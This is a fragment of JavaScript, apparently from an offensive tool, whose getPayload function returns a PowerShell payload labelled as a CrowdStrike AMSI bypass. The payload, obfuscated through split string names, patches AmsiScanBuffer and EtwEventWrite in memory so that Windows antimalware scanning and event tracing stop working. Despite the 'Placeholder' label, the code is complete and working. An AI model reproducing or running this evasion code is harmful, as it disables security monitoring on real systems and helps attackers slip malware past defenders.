...
function getPayload(edr) {
    ...
    const crowdStrikePayload = `#CrowdStrike AMSI Bypass (Placeholder) \n$asm=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.GlobalAssemblyCache -and $_.Location.EndsWith(('Sys'+'tem.dll'))};$typ=$asm.GetType(('Micro'+'soft.Win'+'32.Unsafe'+'NativeMethods'));$mth=$typ.GetMethods()|Where-Object{$_.Name -cmatch ('^Ge'+'.*P.*oc.*'+'ddress$')};$mod=$typ.GetMethod(('Get'+'Module'+'Handle'));$amh=$mod.Invoke($null,@(('am'+'si.d'+'ll')));$p=$mth[0].Invoke($null,@($amh,('Ams'+'iScan'+'Buffer')));$ab=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object Reflection.AssemblyName(('Ref'+'lected'+'Delegate'))),[Reflection.Emit.AssemblyBuilderAccess]::Run);$mb=$ab.DefineDynamicModule(('InMem'+'oryMod'+'ule'),$false);$pt=@([IntPtr],[UInt32],[UInt32],[UInt32].MakeByRefType());$rt=[Bool];$tb=$mb.DefineType(('MyDel'+'egate'+'Type'),('Class'+',Public,Sealed,AnsiClass,AutoClass'),[MulticastDelegate]);$cb=$tb.DefineConstructor(('RTSpe'+'cialName,HideBySig,Public'),[Reflection.CallingConventions]::Standard,$pt);$cb.SetImplementationFlags(('Run'+'time,Managed'));$dm=$tb.DefineMethod(('Invo'+'ke'),('Public,Hide'+'BySig,NewSlot,Virtual'),$rt,$pt);$dm.SetImplementationFlags(('Run'+'time,Managed'));$dt=$tb.CreateType();$vpm=$mod.Invoke($null,@(('kern'+'el32.d'+'ll')));$vpp=$mth[0].Invoke($null,@($vpm,('Virt'+'ualPro'+'tect')));$v=[Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vpp,$dt);$o=0;$pr=$v.Invoke($p,3,0x40,[ref]$o);Start-Sleep 1;[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0x00,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3),0,$p,12);$emh=$mod.Invoke($null,@(('nt'+'dll.d'+'ll')));$e=$mth[0].Invoke($null,@($emh,('Etw'+'Event'+'Write')));$o=0;$pr=$v.Invoke($e,3,0x40,[ref]$o);$s=[Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]);if($s -eq 8){[Runtime.InteropServices.Marshal]::WriteByte($e,0xC3)}else{[Runtime.InteropServices.Marshal]::Copy([Byte[]](0xb8,0xff,0x55),0,$e,3)}`;
